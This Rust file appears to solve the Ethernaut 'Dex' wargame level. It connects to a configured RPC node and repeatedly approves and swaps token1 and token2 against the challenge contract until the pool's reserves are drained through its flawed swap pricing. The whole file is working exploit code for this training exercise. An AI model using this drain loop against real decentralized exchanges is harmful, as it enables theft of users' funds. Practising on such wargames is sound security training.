#[allow(unused_imports)]
use alloy::{
    network::{EthereumWallet, TransactionBuilder},
    primitives::{
        Address, B256, Bytes, U256, address,
        keccak256,
        utils::{Unit, format_ether},
    },
    providers::{Provider, ProviderBuilder},
    rpc::types::TransactionRequest,
    signers::local::PrivateKeySigner,
    sol,
};

sol!{
    #[sol(rpc)]
    contract Dex {
        function token1() external view returns (address);
        function token2() external view returns (address);
        function balanceOf(address token, address account) public view returns (uint256);
        
        function approve(address spender, uint256 amount) public;
        function swap(address from, address to, uint256 amount) public;
    }
}

use crate::ethernaut;
use tokio::runtime::Runtime;

#[allow(dead_code)]
pub fn level22_runner() -> Result<(), Box<dyn std::error::Error>> {
    let rt = Runtime::new()?;
    rt.block_on(level22())?;
    
    Ok(())
}

async fn level22() -> Result<(), Box<dyn std::error::Error>> {
    let alice_signer: PrivateKeySigner = ethernaut::ALICE_KEY.parse()?;
    let bob_signer: PrivateKeySigner = ethernaut::BOB_KEY.parse()?;

    let mut wallet = EthereumWallet::from(alice_signer);
    wallet.register_signer(bob_signer);

    let provider = ProviderBuilder::new()
        .wallet(wallet)
        .connect(ethernaut::RPC)
        .await?;

    let dex_address = "0x3BB07556e3cc734d0B40b3C899E151DA18b24530".parse()?;
    let dex = Dex::new(dex_address, provider.clone());

    let token1_address = dex.token1().call().await?;
    let token2_address = dex.token2().call().await?;
    let alice = ethernaut::ALICE.parse()?;
    let balance1 = dex.balanceOf(token1_address, alice).call().await?;
    let balance2 = dex.balanceOf(token2_address, alice).call().await?;

    println!("[CHECK]");
    println!("    token1 = {token1_address}");
    println!("    token2 = {token2_address}");
    println!("    balance(token1) = {balance1}");
    println!("    balance(token2) = {balance2}\n");

    let mut direction = true;

    loop {
        match direction {
            true => {
                let alice_balance = dex.balanceOf(token1_address, alice).call().await?;
                let dex_balance = dex.balanceOf(token1_address, dex_address).call().await?;

                let amount = alice_balance.min(dex_balance);

                if amount == 0 {
                    println!("[DEBUG]    amount == 0");
                    break;
                }

                println!("[CHECK]");
                println!("    alice_balance = {alice_balance}");
                println!("    dex_balance = {dex_balance}");
                println!("    amount = {amount}\n");

                println!("[EXECUTE]");
                let approve_tx = dex.approve(dex_address, amount)
                    .send()
                    .await?;
                println!("[Dex.approve()]    Pending transaction... {}", approve_tx.tx_hash());
                let approve_receipt = approve_tx.get_receipt().await?;
                println!(
                    "[Dex.approve()]    Transaction included in block {}\n",
                    approve_receipt.block_number.expect("Failed to get block number")
                );
                
                let swap_tx = dex.swap(token1_address, token2_address, amount)
                    .send()
                    .await?;
                println!("[Dex.swap()]    Pending transaction... {}", swap_tx.tx_hash());
                let swap_receipt = swap_tx.get_receipt().await?;
                println!(
                    "[Dex.swap()]    Transaction included in block {}\n",
                    swap_receipt.block_number.expect("Failed to get block number")
                );
                
                direction = false;
            }

            false => {
                let alice_balance = dex.balanceOf(token2_address, alice).call().await?;
                let dex_balance = dex.balanceOf(token2_address, dex_address).call().await?;

                let amount = alice_balance.min(dex_balance);

                if amount == 0 {
                    println!("[DEBUG]    amount == 0");
                    break;
                }

                println!("[CHECK]");
                println!("    alice_balance = {alice_balance}");
                println!("    dex_balance = {dex_balance}");
                println!("    amount = {amount}\n");

                println!("[EXECUTE]");
                let approve_tx = dex.approve(dex_address, amount)
                    .send()
                    .await?;
                println!("[Dex.approve()]    Pending transaction... {}", approve_tx.tx_hash());
                let approve_receipt = approve_tx.get_receipt().await?;
                println!(
                    "[Dex.approve()]    Transaction included in block {}\n",
                    approve_receipt.block_number.expect("Failed to get block number")
                );
                
                let swap_tx = dex.swap(token2_address, token1_address, amount)
                    .send()
                    .await?;
                println!("[Dex.swap()]    Pending transaction... {}", swap_tx.tx_hash());
                let swap_receipt = swap_tx.get_receipt().await?;
                println!(
                    "[Dex.swap()]    Transaction included in block {}\n",
                    swap_receipt.block_number.expect("Failed to get block number")
                );

                direction = true;
            }
        }
        println!("[CHECK]");
        println!("    User's token1 = {}", dex.balanceOf(token1_address, alice).call().await?);
        println!("    User's token2 = {}", dex.balanceOf(token2_address, alice).call().await?);
        println!("    Pool's token1 = {}", dex.balanceOf(token1_address, dex_address).call().await?);
        println!("    Pool's token2 = {}\n", dex.balanceOf(token2_address, dex_address).call().await?);
    }

    
    Ok(())
}


